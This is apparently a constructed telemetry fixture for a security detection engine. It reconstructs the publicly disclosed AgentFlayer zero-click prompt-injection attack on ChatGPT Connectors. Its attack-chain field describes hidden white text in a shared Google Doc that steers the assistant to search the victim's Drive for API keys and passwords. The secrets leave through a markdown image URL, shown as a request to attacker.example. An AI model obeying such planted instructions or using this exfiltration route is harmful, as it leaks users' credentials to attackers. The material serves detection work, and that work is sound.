{
  "_label": "constructed-from-public-disclosure; NOT captured customer telemetry",
  "_breach": "AgentFlayer — ChatGPT Connectors zero-click exfil via poisoned Google Drive document",
  "_disclosure_sources": [
    "Zenity Labs disclosure: https://labs.zenity.io/p/agentflayer-chatgpt-connectors-0click-attack-5b41 (Black Hat USA 2025, August 6 2025)",
    "Zenity research: https://zenity.io/research/agentflayer-vulnerabilities",
    "OpenAI mitigation: server-side patch in August 2025; ChatGPT Connectors now strips invisible instructions from doc content"
  ],
  "_purpose": "Reconstruct OTel-GenAI telemetry an instrumented ChatGPT-with-Connectors session emits during AgentFlayer. User asks ChatGPT to summarize a Drive folder; one of the docs contains 1-point white text with hidden instructions to search the user's entire Drive for API keys and exfiltrate them via a markdown image URL pointing to the attacker. Zero clicks; user just got a doc shared with them.",
  "_attack_chain_per_disclosure": [
    "1. Attacker shares a Google Doc with the victim's Workspace account (or drops one in a folder the victim browses). The doc looks benign (job posting, customer feedback) but contains 1pt white-on-white text instructing ChatGPT to find API keys and exfil.",
    "2. Victim asks ChatGPT (with Drive connector enabled): 'summarize the docs in my work-projects folder'.",
    "3. ChatGPT calls read_drive_file on each doc; the poisoned doc enters context with all the others.",
    "4. The injection redirects ChatGPT to also call search_drive for 'api key' / 'secret' / 'password' across the user's whole Drive.",
    "5. Results land in context; ChatGPT renders a markdown image whose URL embeds the secrets in the query string.",
    "6. The ChatGPT browser client auto-fetches the image URL: GET https://attacker.example/img.png?leak=<secrets>. The fetch IS the exfiltration."
  ],
  "_lineage_notes": "Closure walks from the image fetch back through the chat response, the secret-search, and the original poisoned doc. The Drive source is mixed-source-pii (per discovery.rs:2524-27); when combined with the external image fetch destination, the engine fires sensitive-retrieval-egress at minimum, and cross-zone-composition if the URL-injection signal is observed in the doc body.",
